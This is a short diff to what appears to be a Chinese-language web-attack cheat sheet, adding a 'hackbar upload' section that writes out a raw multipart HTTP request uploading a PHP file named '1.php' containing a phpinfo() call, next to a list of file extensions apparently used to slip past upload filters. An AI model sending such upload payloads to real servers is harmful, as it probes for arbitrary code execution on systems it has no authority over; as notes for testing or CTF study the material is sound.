@@ -14,6 +14,16 @@ return Function.prototype.temp_constructor.apply(this, arguments);
 
 # 文件上传
 
+## hackbar上传
+```http
+------WebKitFormBoundarydcUAtHSB6SJDdmLg
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: application/octet-stream
+
+<?= phpinfo();
+------WebKitFormBoundarydcUAtHSB6SJDdmLg--
+```
+
 ## 后缀
 ```bash
     "php",
